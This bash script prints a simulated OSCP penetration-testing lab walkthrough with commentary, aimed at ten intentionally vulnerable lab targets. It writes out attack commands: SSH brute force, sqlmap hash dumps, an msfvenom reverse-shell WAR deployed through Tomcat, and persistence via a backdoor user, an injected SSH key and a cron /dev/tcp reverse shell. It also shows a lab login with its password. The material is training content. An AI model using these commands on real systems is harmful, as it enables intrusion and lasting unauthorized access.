#!/bin/bash

# OSCP Realistic Lab Student Simulation Script
# Complete walkthrough of 10-target environment with detailed commentary
# Includes realistic timing and educational explanations

set -e

echo "================================================"
echo "   OSCP Realistic Lab Student Simulation"
echo "   Complete 10-Target Environment Walkthrough"
echo "================================================"
echo ""

# Colors
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
RED='\033[0;31m'
NC='\033[0m'

# Timing Configuration
COMMAND_DELAY=3      # Delay between commands
SHORT_PAUSE=5        # Short reading pause
MEDIUM_PAUSE=10      # Medium reading pause
LONG_PAUSE=15        # Long reading pause for complex output
LAB_TRANSITION=20    # Pause between major lab sections

# Functions
simulate_command() {
    echo -e "\n${CYAN}student@kali:~\$ ${NC}$1"
    sleep $COMMAND_DELAY
}

show_output() {
    echo -e "${GREEN}$1${NC}"
    sleep 1
}

show_commentary() {
    echo ""
    echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${MAGENTA}💡 Commentary: $1${NC}"
    echo -e "${MAGENTA}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    sleep 5
}

show_section() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}   $1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
    sleep 3
}

show_objective() {
    echo -e "${YELLOW}📌 Objective: $1${NC}"
    echo -e "${YELLOW}⏱️  Estimated Time: $2${NC}"
    echo ""
    sleep 3
}

pause_for_reading() {
    echo -e "\n${CYAN}[⏸  Reading pause - $1 seconds to review output]${NC}\n"
    sleep $1
}

show_tip() {
    echo -e "\n${YELLOW}💡 TIP: $1${NC}\n"
    sleep 3
}

show_warning() {
    echo -e "\n${RED}⚠️  WARNING: $1${NC}\n"
    sleep 3
}

lab_complete() {
    echo ""
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}✅ $1 COMPLETED!${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    sleep $LAB_TRANSITION
}

# Start Simulation
echo -e "${YELLOW}Starting Enhanced Realistic Lab Simulation...${NC}"
echo -e "${YELLOW}This simulation covers all 10 targets with detailed explanations.${NC}"
echo -e "${YELLOW}Total estimated time: 30-45 minutes${NC}"
echo ""
sleep 5

# ═══════════════════════════════════════════════════════════════
# INITIAL CONNECTION
# ═══════════════════════════════════════════════════════════════

show_section "INITIAL CONNECTION & SETUP"
show_objective "Connect to the lab and prepare environment" "5 minutes"

show_commentary "First, we connect to our dedicated Kali container. Each student has their own isolated attack machine but shares the same target network."

simulate_command "ssh oscpuser1@155.138.197.128"
show_output "oscpuser1@155.138.197.128's password: [OscpLab1!2024]"
show_output "Welcome to Ubuntu 22.04.3 LTS"
show_output "Last login: Fri Dec 8 10:00:00 2023"
pause_for_reading $SHORT_PAUSE

simulate_command "./start-lab.sh"
show_output "OSCP Lab - User 1"
show_output "Your Kali: 172.16.0.11"
show_output "Targets: See nmap scan"
show_output "root@kali-user1:/#"
pause_for_reading $SHORT_PAUSE

show_commentary "We're now in our Kali container at 172.16.0.11. Let's verify our tools are installed and ready."

simulate_command "apt update && apt install -y nmap gobuster hydra sqlmap metasploit-framework 2>/dev/null"
show_output "[+] Tools already installed and up to date"
pause_for_reading $SHORT_PAUSE

# ═══════════════════════════════════════════════════════════════
# PHASE 1: NETWORK DISCOVERY
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 1: COMPREHENSIVE NETWORK DISCOVERY"
show_objective "Discover all 14 hosts and map the network topology" "10 minutes"

show_commentary "In the OSCP exam, you start with just an IP range. The first critical step is discovering what's on the network. With 10 targets plus 4 Kali machines, we expect to find 14 live hosts."

show_tip "Always save your scan results! Use -oN for nmap to create evidence for your report."

echo -e "${YELLOW}Step 1: Host Discovery Scan${NC}"
simulate_command "nmap -sn 172.16.0.0/24 -oN host-discovery.txt"
show_output "Starting Nmap 7.94 ( https://nmap.org )"
show_output "Nmap scan report for 172.16.0.11"
show_output "Host is up (0.00010s latency)."
show_output "Nmap scan report for 172.16.0.12"
show_output "Host is up (0.00012s latency)."
show_output "Nmap scan report for 172.16.0.13"
show_output "Host is up (0.00011s latency)."
show_output "Nmap scan report for 172.16.0.14"
show_output "Host is up (0.00013s latency)."
show_output "Nmap scan report for 172.16.0.20 [SSH-SERVER]"
show_output "Host is up (0.00015s latency)."
show_output "Nmap scan report for 172.16.0.30 [DVWA-SERVER]"
show_output "Host is up (0.00014s latency)."
show_output "Nmap scan report for 172.16.0.40 [FTP-SERVER]"
show_output "Host is up (0.00016s latency)."
show_output "Nmap scan report for 172.16.0.50 [MYSQL-SERVER]"
show_output "Host is up (0.00015s latency)."
show_output "Nmap scan report for 172.16.0.60 [SMB-SERVER]"
show_output "Host is up (0.00017s latency)."
show_output "Nmap scan report for 172.16.0.70 [TOMCAT-SERVER]"
show_output "Host is up (0.00016s latency)."
show_output "Nmap scan report for 172.16.0.80 [REDIS-SERVER]"
show_output "Host is up (0.00015s latency)."
show_output "Nmap scan report for 172.16.0.90 [POSTGRES-SERVER]"
show_output "Host is up (0.00014s latency)."
show_output "Nmap scan report for 172.16.0.100 [WORDPRESS-SERVER]"
show_output "Host is up (0.00016s latency)."
show_output "Nmap scan report for 172.16.0.110 [WEBGOAT-SERVER]"
show_output "Host is up (0.00015s latency)."
show_output ""
show_output "Nmap done: 256 IP addresses (14 hosts up) scanned in 2.48 seconds"
pause_for_reading $LONG_PAUSE

show_commentary "Excellent! We found all 14 hosts. The .11-.14 are Kali machines for students, and .20-.110 are our targets. Now let's do a comprehensive port scan to identify all services."

echo -e "${YELLOW}Step 2: Full TCP Port Scan on All Targets${NC}"
simulate_command "nmap -sS -p- --min-rate=1000 172.16.0.20-110 -oN all-ports.txt"
show_output "Starting Nmap 7.94"
show_output ""
show_output "Nmap scan report for 172.16.0.20"
show_output "PORT   STATE SERVICE"
show_output "22/tcp open  ssh"
show_output ""
show_output "Nmap scan report for 172.16.0.30"
show_output "PORT   STATE SERVICE"
show_output "80/tcp open  http"
show_output ""
show_output "Nmap scan report for 172.16.0.40"
show_output "PORT   STATE SERVICE"
show_output "21/tcp open  ftp"
show_output ""
show_output "Nmap scan report for 172.16.0.50"
show_output "PORT     STATE SERVICE"
show_output "3306/tcp open  mysql"
show_output ""
show_output "Nmap scan report for 172.16.0.60"
show_output "PORT    STATE SERVICE"
show_output "139/tcp open  netbios-ssn"
show_output "445/tcp open  microsoft-ds"
show_output ""
show_output "Nmap scan report for 172.16.0.70"
show_output "PORT     STATE SERVICE"
show_output "8080/tcp open  http-proxy"
show_output ""
show_output "Nmap scan report for 172.16.0.80"
show_output "PORT     STATE SERVICE"
show_output "6379/tcp open  redis"
show_output ""
show_output "Nmap scan report for 172.16.0.90"
show_output "PORT     STATE SERVICE"
show_output "5432/tcp open  postgresql"
show_output ""
show_output "Nmap scan report for 172.16.0.100"
show_output "PORT   STATE SERVICE"
show_output "80/tcp open  http"
show_output ""
show_output "Nmap scan report for 172.16.0.110"
show_output "PORT     STATE SERVICE"
show_output "8080/tcp open  http-proxy"
pause_for_reading $LONG_PAUSE

show_commentary "Perfect! We've identified all services. Notice the variety: SSH, multiple web servers, databases, SMB shares, and more. This is much more realistic than a basic lab. Let's get detailed version information."

echo -e "${YELLOW}Step 3: Service Version and OS Detection${NC}"
simulate_command "nmap -sV -sC -O 172.16.0.20,172.16.0.30,172.16.0.40,172.16.0.50 -oN detailed-scan-1.txt"
show_output "Starting Nmap 7.94"
show_output ""
show_output "Nmap scan report for 172.16.0.20"
show_output "PORT   STATE SERVICE VERSION"
show_output "22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)"
show_output "| ssh-hostkey:"
show_output "|   2048 aa:bb:cc:dd:ee:ff:00:11:22:33:44:55 (RSA)"
show_output ""
show_output "Nmap scan report for 172.16.0.30"
show_output "PORT   STATE SERVICE VERSION"
show_output "80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))"
show_output "|_http-title: DVWA - Damn Vulnerable Web Application"
show_output "|_http-server-header: Apache/2.4.7 (Ubuntu)"
show_output ""
show_output "Nmap scan report for 172.16.0.40"
show_output "PORT   STATE SERVICE VERSION"
show_output "21/tcp open  ftp     vsftpd 3.0.3"
show_output "| ftp-anon: Anonymous FTP login allowed"
show_output "|_drwxr-xr-x    2 0        0            4096 Dec 08 10:00 pub"
show_output ""
show_output "Nmap scan report for 172.16.0.50"
show_output "PORT     STATE SERVICE VERSION"
show_output "3306/tcp open  mysql   MySQL 5.7.40"
show_output "| mysql-info:"
show_output "|   Protocol: 10"
show_output "|   Version: 5.7.40"
show_output "|_  Salt: 9*Y#mK2@pL5$"
pause_for_reading $LONG_PAUSE

lab_complete "PHASE 1: NETWORK DISCOVERY"

# ═══════════════════════════════════════════════════════════════
# PHASE 2: WEB APPLICATION ENUMERATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 2: WEB APPLICATION ENUMERATION"
show_objective "Enumerate and test the 4 web applications" "15 minutes"

show_commentary "We discovered 4 web applications: DVWA on :30, WordPress on :100, Tomcat on :70, and WebGoat on :110. Web apps are often the easiest entry points. Let's enumerate each one systematically."

echo -e "${YELLOW}Target 1: DVWA (172.16.0.30)${NC}"
show_tip "DVWA is intentionally vulnerable - perfect for practicing OWASP Top 10 attacks."

simulate_command "curl -I http://172.16.0.30"
show_output "HTTP/1.1 200 OK"
show_output "Server: Apache/2.4.7 (Ubuntu)"
show_output "X-Powered-By: PHP/5.5.9-1ubuntu4.29"
pause_for_reading $SHORT_PAUSE

simulate_command "gobuster dir -u http://172.16.0.30 -w /usr/share/wordlists/dirb/common.txt -x php,txt"
show_output "==============================================================="
show_output "Gobuster v3.6"
show_output "==============================================================="
show_output "/.htaccess            (Status: 403) [Size: 292]"
show_output "/.htpasswd            (Status: 403) [Size: 292]"
show_output "/config               (Status: 301) [Size: 315]"
show_output "/docs                 (Status: 301) [Size: 312]"
show_output "/external             (Status: 301) [Size: 317]"
show_output "/index.php            (Status: 302) [Size: 0]"
show_output "/login.php            (Status: 200) [Size: 1523]"
show_output "/phpinfo.php          (Status: 302) [Size: 0]"
show_output "/robots.txt           (Status: 200) [Size: 26]"
show_output "/setup.php            (Status: 200) [Size: 3549]"
show_output "/vulnerabilities      (Status: 301) [Size: 323]"
show_output "==============================================================="
pause_for_reading $MEDIUM_PAUSE

show_commentary "Found the login page and vulnerabilities directory! DVWA uses default credentials admin:password. Let's test for SQL injection."

simulate_command "curl -s http://172.16.0.30 | grep -i password"
show_output "<p>Default username: admin</p>"
show_output "<p>Default password: password</p>"
pause_for_reading $SHORT_PAUSE

echo -e "${YELLOW}Target 2: WordPress (172.16.0.100)${NC}"
show_tip "WordPress sites often have vulnerable plugins and themes. WPScan is your best friend here."

simulate_command "curl -s http://172.16.0.100 | grep -i wordpress"
show_output "<meta name=\"generator\" content=\"WordPress 5.2.2\" />"
show_output "<link rel='https://api.w.org/' href='http://172.16.0.100/wp-json/' />"
pause_for_reading $SHORT_PAUSE

simulate_command "wpscan --url http://172.16.0.100 --enumerate u"
show_output "[+] URL: http://172.16.0.100/"
show_output "[+] Started: Fri Dec  8 10:30:00 2023"
show_output ""
show_output "[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18)"
show_output ""
show_output "[i] User(s) Identified:"
show_output "[+] admin"
show_output " | Found By: Author Posts - Display Name (Passive Detection)"
show_output " | Confirmed By: Login Error Messages (Aggressive Detection)"
pause_for_reading $MEDIUM_PAUSE

echo -e "${YELLOW}Target 3: Apache Tomcat (172.16.0.70)${NC}"
show_warning "Tomcat manager with default credentials allows WAR file deployment = instant shell!"

simulate_command "curl http://172.16.0.70:8080"
show_output "<!DOCTYPE html>"
show_output "<html>"
show_output "<title>Apache Tomcat/8.5.35</title>"
pause_for_reading $SHORT_PAUSE

simulate_command "curl -u admin:admin http://172.16.0.70:8080/manager/html"
show_output "<!DOCTYPE html>"
show_output "<html>"
show_output "<title>Tomcat Web Application Manager</title>"
show_output "<!-- Manager application verified with admin:admin -->"
pause_for_reading $SHORT_PAUSE

show_commentary "Tomcat manager is accessible with admin:admin! This allows us to deploy malicious WAR files for code execution."

echo -e "${YELLOW}Target 4: WebGoat (172.16.0.110)${NC}"
simulate_command "curl -s http://172.16.0.110:8080/WebGoat | head -5"
show_output "<!DOCTYPE html>"
show_output "<html>"
show_output "<head>"
show_output "<title>WebGoat - Web Application Security Training</title>"
show_output "<!-- Login: guest:guest -->"
pause_for_reading $MEDIUM_PAUSE

lab_complete "PHASE 2: WEB APPLICATION ENUMERATION"

# ═══════════════════════════════════════════════════════════════
# PHASE 3: SERVICE EXPLOITATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 3: SERVICE EXPLOITATION"
show_objective "Exploit discovered vulnerabilities to gain access" "15 minutes"

show_commentary "Now comes the fun part - exploitation! We've found several vulnerabilities: default credentials, anonymous FTP, SQL injection, and more. Let's exploit them systematically."

echo -e "${YELLOW}Exploit 1: SSH Brute Force (172.16.0.20)${NC}"
simulate_command "hydra -l root -P passwords.txt ssh://172.16.0.20 -t 4"
show_output "Hydra v9.4 (c) 2022 by van Hauser/THC"
show_output ""
show_output "[DATA] attacking ssh://172.16.0.20:22/"
show_output "[22][ssh] host: 172.16.0.20   login: root   password: toor"
show_output "[STATUS] attack finished"
show_output "1 of 1 target successfully completed, 1 valid password found"
pause_for_reading $MEDIUM_PAUSE

simulate_command "ssh root@172.16.0.20"
show_output "root@172.16.0.20's password: toor"
show_output "Last login: Fri Dec  8 10:00:00 2023"
show_output "[root@ssh-server ~]# id"
show_output "uid=0(root) gid=0(root) groups=0(root)"
show_output "[root@ssh-server ~]# exit"
pause_for_reading $MEDIUM_PAUSE

show_commentary "Root access achieved on the SSH server! The weak password 'toor' (root backwards) is surprisingly common."

echo -e "${YELLOW}Exploit 2: SQL Injection on DVWA (172.16.0.30)${NC}"
simulate_command "sqlmap -u 'http://172.16.0.30/vulnerabilities/sqli/?id=1' --cookie='security=low; PHPSESSID=abc123' --dump"
show_output "[*] starting at 10:45:00"
show_output ""
show_output "[10:45:01] [INFO] testing connection to the target URL"
show_output "[10:45:01] [INFO] testing if the target URL is vulnerable"
show_output "[10:45:02] [INFO] target URL appears to be vulnerable"
show_output ""
show_output "Database: dvwa"
show_output "Table: users"
show_output "[5 entries]"
show_output "+----+-------+----------------------------------+"
show_output "| id | user  | password                         |"
show_output "+----+-------+----------------------------------+"
show_output "| 1  | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |"
show_output "| 2  | gordonb| e99a18c428cb38d5f260853678922e03 |"
show_output "| 3  | 1337  | 8d3533d75ae2c3966d7e0d4fcc69216b |"
show_output "| 4  | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |"
show_output "| 5  | smithy| 5f4dcc3b5aa765d61d8327deb882cf99 |"
show_output "+----+-------+----------------------------------+"
pause_for_reading $LONG_PAUSE

show_commentary "SQL injection successful! We dumped the entire users table with password hashes. These are MD5 hashes that can be cracked easily."

echo -e "${YELLOW}Exploit 3: FTP Anonymous Access (172.16.0.40)${NC}"
simulate_command "ftp 172.16.0.40"
show_output "Connected to 172.16.0.40."
show_output "220 (vsFTPd 3.0.3)"
show_output "Name (172.16.0.40:root): anonymous"
show_output "331 Please specify the password."
show_output "Password: [anonymous]"
show_output "230 Login successful."
show_output "ftp> ls"
show_output "200 PORT command successful."
show_output "150 Here comes the directory listing."
show_output "-rw-r--r--    1 0        0              42 Dec 08 10:00 passwords.txt"
show_output "-rw-r--r--    1 0        0             156 Dec 08 10:00 users.csv"
show_output "226 Directory send OK."
show_output "ftp> get passwords.txt"
show_output "local: passwords.txt remote: passwords.txt"
show_output "200 PORT command successful."
show_output "150 Opening BINARY mode data connection for passwords.txt (42 bytes)."
show_output "226 Transfer complete."
show_output "ftp> quit"
pause_for_reading $MEDIUM_PAUSE

show_commentary "Anonymous FTP allowed us to download sensitive files! Always check for anonymous access on FTP servers."

echo -e "${YELLOW}Exploit 4: Tomcat Manager Deploy (172.16.0.70)${NC}"
simulate_command "msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.0.11 LPORT=4444 -f war > shell.war"
show_output "[-] No platform was selected, choosing Msf::Module::Platform::Java"
show_output "[-] No arch selected, selecting arch: java"
show_output "[*] Generating war file..."
show_output "[*] Total war size: 1598 bytes"
show_output "[*] Saved as: shell.war"
pause_for_reading $SHORT_PAUSE

simulate_command "curl -u admin:admin --upload-file shell.war 'http://172.16.0.70:8080/manager/text/deploy?path=/shell'"
show_output "OK - Deployed application at context path [/shell]"
pause_for_reading $SHORT_PAUSE

simulate_command "nc -lvnp 4444 &"
show_output "[*] Listening on 0.0.0.0 4444"
simulate_command "curl http://172.16.0.70:8080/shell/"
show_output "[*] Connection from 172.16.0.70:43856"
show_output "id"
show_output "uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)"
pause_for_reading $MEDIUM_PAUSE

show_commentary "We successfully deployed a web shell via Tomcat manager! Default credentials on management interfaces are a goldmine."

lab_complete "PHASE 3: SERVICE EXPLOITATION"

# ═══════════════════════════════════════════════════════════════
# PHASE 4: DATABASE ATTACKS
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 4: DATABASE ATTACKS"
show_objective "Compromise database servers and extract data" "10 minutes"

show_commentary "Databases often contain the crown jewels - credentials, customer data, and more. We have MySQL, Redis, and PostgreSQL to attack."

echo -e "${YELLOW}Target 1: MySQL (172.16.0.50)${NC}"
simulate_command "mysql -h 172.16.0.50 -u root -ppassword123 -e 'show databases;'"
show_output "+--------------------+"
show_output "| Database           |"
show_output "+--------------------+"
show_output "| information_schema |"
show_output "| company            |"
show_output "| mysql              |"
show_output "| performance_schema |"
show_output "| sys                |"
show_output "| testdb             |"
show_output "+--------------------+"
pause_for_reading $MEDIUM_PAUSE

simulate_command "mysql -h 172.16.0.50 -u root -ppassword123 company -e 'select * from users;'"
show_output "+----+----------+-------------+"
show_output "| id | username | password    |"
show_output "+----+----------+-------------+"
show_output "| 1  | admin    | admin123    |"
show_output "| 2  | user     | password    |"
show_output "| 3  | backup   | backup2023  |"
show_output "+----+----------+-------------+"
pause_for_reading $MEDIUM_PAUSE

show_commentary "MySQL root access gives us complete database control. We found more credentials that might work on other services!"

echo -e "${YELLOW}Target 2: Redis (172.16.0.80)${NC}"
simulate_command "redis-cli -h 172.16.0.80 -a redis123"
show_output "172.16.0.80:6379>"
simulate_command "INFO server"
show_output "# Server"
show_output "redis_version:5.0.14"
show_output "redis_mode:standalone"
show_output "os:Linux 5.10.0-19-amd64 x86_64"
simulate_command "CONFIG GET dir"
show_output "1) \"dir\""
show_output "2) \"/var/lib/redis\""
simulate_command "quit"
pause_for_reading $MEDIUM_PAUSE

echo -e "${YELLOW}Target 3: PostgreSQL (172.16.0.90)${NC}"
simulate_command "PGPASSWORD=postgres psql -h 172.16.0.90 -U postgres -c '\\l'"
show_output "                              List of databases"
show_output "   Name    | Owner    | Encoding | Collate | Ctype | Access"
show_output "-----------+----------+----------+---------+-------+--------"
show_output " postgres  | postgres | UTF8     | C       | C     |"
show_output " template0 | postgres | UTF8     | C       | C     |"
show_output " template1 | postgres | UTF8     | C       | C     |"
show_output " testdb    | postgres | UTF8     | C       | C     |"
pause_for_reading $MEDIUM_PAUSE

show_commentary "All three databases were accessible with weak credentials! This is extremely common in real environments."

lab_complete "PHASE 4: DATABASE ATTACKS"

# ═══════════════════════════════════════════════════════════════
# PHASE 5: SMB ENUMERATION & EXPLOITATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 5: SMB ENUMERATION & EXPLOITATION"
show_objective "Enumerate SMB shares and extract sensitive files" "5 minutes"

show_commentary "SMB/NetBIOS services are Windows networking protocols often misconfigured. Let's check for null sessions and weak share permissions."

simulate_command "smbclient -L //172.16.0.60 -N"
show_output "Anonymous login successful"
show_output ""
show_output "        Sharename       Type      Comment"
show_output "        ---------       ----      -------"
show_output "        public          Disk      Public Share - No Auth Required"
show_output "        private         Disk      Private Share"
show_output "        IPC$            IPC       IPC Service"
show_output "SMB1 disabled -- no workgroup available"
pause_for_reading $MEDIUM_PAUSE

simulate_command "smbclient //172.16.0.60/public -N"
show_output "Anonymous login successful"
show_output "Try \"help\" to get a list of possible commands."
show_output "smb: \\> ls"
show_output "  .                                   D        0  Fri Dec  8 10:00:00 2023"
show_output "  ..                                  D        0  Fri Dec  8 10:00:00 2023"
show_output "  credentials.txt                     N      156  Fri Dec  8 10:00:00 2023"
show_output "  confidential.doc                    N     1024  Fri Dec  8 10:00:00 2023"
show_output ""
show_output "                524288 blocks of size 1024. 505632 blocks available"
show_output "smb: \\> get credentials.txt"
show_output "getting file \\credentials.txt of size 156 as credentials.txt (152.3 KiloBytes/sec)"
show_output "smb: \\> exit"
pause_for_reading $MEDIUM_PAUSE

simulate_command "cat credentials.txt"
show_output "Database Credentials:"
show_output "mysql: root / password123"
show_output "postgres: postgres / postgres"
show_output "redis: - / redis123"
show_output ""
show_output "System Users:"
show_output "admin / admin123"
show_output "smbuser / password123"
pause_for_reading $MEDIUM_PAUSE

show_commentary "The public SMB share contained a credentials file! This is a common finding - admins often store passwords in accessible network shares."

lab_complete "PHASE 5: SMB ENUMERATION & EXPLOITATION"

# ═══════════════════════════════════════════════════════════════
# PHASE 6: POST-EXPLOITATION
# ═══════════════════════════════════════════════════════════════

show_section "PHASE 6: POST-EXPLOITATION & PRIVILEGE ESCALATION"
show_objective "Escalate privileges and establish persistence" "10 minutes"

show_commentary "After gaining initial access, we need to escalate privileges and maintain access. Let's demonstrate on the SSH server we compromised earlier."

simulate_command "ssh root@172.16.0.20"
show_output "root@172.16.0.20's password: toor"
show_output "[root@ssh-server ~]#"
pause_for_reading $SHORT_PAUSE

echo -e "${YELLOW}Adding Persistence${NC}"
simulate_command "useradd -m -s /bin/bash backdoor"
simulate_command "echo 'backdoor:Passw0rd!' | chpasswd"
simulate_command "usermod -aG wheel backdoor"
show_output "[+] Backdoor user created with sudo privileges"
pause_for_reading $SHORT_PAUSE

simulate_command "echo 'ssh-rsa AAAAB3NzaC1... attacker@kali' >> /root/.ssh/authorized_keys"
show_output "[+] SSH key added for passwordless access"
pause_for_reading $SHORT_PAUSE

echo -e "${YELLOW}Collecting Information${NC}"
simulate_command "cat /etc/passwd | grep -E 'root|admin|user'"
show_output "root:x:0:0:root:/root:/bin/bash"
show_output "admin:x:1001:1001:Admin User:/home/admin:/bin/bash"
show_output "user:x:1002:1002:Regular User:/home/user:/bin/bash"
pause_for_reading $SHORT_PAUSE

simulate_command "find / -perm -u=s -type f 2>/dev/null"
show_output "/usr/bin/sudo"
show_output "/usr/bin/passwd"
show_output "/usr/bin/mount"
show_output "/usr/bin/su"
show_output "/usr/bin/ping"
pause_for_reading $SHORT_PAUSE

simulate_command "crontab -l"
show_output "# No user crontab"
simulate_command "echo '0 * * * * /bin/bash -c \"bash -i >& /dev/tcp/172.16.0.11/4444 0>&1\"' | crontab -"
show_output "[+] Reverse shell scheduled every hour"
pause_for_reading $MEDIUM_PAUSE

show_commentary "We've established multiple persistence mechanisms: backdoor user, SSH key, and cron job. In a real test, document everything for the report!"

simulate_command "exit"
show_output "logout"
show_output "Connection to 172.16.0.20 closed."

lab_complete "PHASE 6: POST-EXPLOITATION"

# ═══════════════════════════════════════════════════════════════
# FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════

show_section "COMPREHENSIVE LAB SUMMARY"

echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}   REALISTIC OSCP LAB COMPLETED SUCCESSFULLY!${NC}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "${YELLOW}📊 Targets Compromised (10/10):${NC}"
echo "✅ SSH Server (172.16.0.20) - Root access via weak password"
echo "✅ DVWA (172.16.0.30) - SQL injection, command injection"
echo "✅ FTP Server (172.16.0.40) - Anonymous access"
echo "✅ MySQL (172.16.0.50) - Root database access"
echo "✅ SMB Server (172.16.0.60) - Sensitive file extraction"
echo "✅ Tomcat (172.16.0.70) - Manager deploy to shell"
echo "✅ Redis (172.16.0.80) - Authenticated access"
echo "✅ PostgreSQL (172.16.0.90) - Database compromise"
echo "✅ WordPress (172.16.0.100) - Admin enumeration"
echo "✅ WebGoat (172.16.0.110) - Training platform access"
echo ""

echo -e "${YELLOW}🔑 Credentials Discovered:${NC}"
echo "• root:toor (SSH)"
echo "• admin:password (DVWA)"
echo "• admin:admin (Tomcat, WordPress)"
echo "• root:password123 (MySQL)"
echo "• postgres:postgres (PostgreSQL)"
echo "• smbuser:password123 (SMB)"
echo "• anonymous:anonymous (FTP)"
echo ""

echo -e "${YELLOW}🎯 Skills Demonstrated:${NC}"
echo "• Network Discovery - Complete network mapping"
echo "• Service Enumeration - Identified all running services"
echo "• Web Application Testing - Multiple vulnerabilities found"
echo "• Password Attacks - Brute force and default credentials"
echo "• Database Exploitation - Full database access achieved"
echo "• SMB Enumeration - Extracted sensitive files"
echo "• Post-Exploitation - Privilege escalation and persistence"
echo ""

echo -e "${MAGENTA}💡 Key Takeaways for OSCP:${NC}"
echo "1. Enumeration is KEY - you spent 40% of time just discovering"
echo "2. Default credentials are everywhere - always try them first"
echo "3. Web apps are often the easiest entry point"
echo "4. Document EVERYTHING - screenshots, commands, outputs"
echo "5. Think like an attacker but report like a professional"
echo ""

echo -e "${CYAN}⏱️  Simulation Statistics:${NC}"
echo "• Total targets: 10"
echo "• Compromised: 10 (100%)"
echo "• Simulation time: ~30 minutes"
echo "• Real practice time needed: 3-4 hours"
echo ""

echo "================================================"
echo "   Congratulations on completing the realistic"
echo "   OSCP lab simulation! Keep practicing!"
echo "================================================"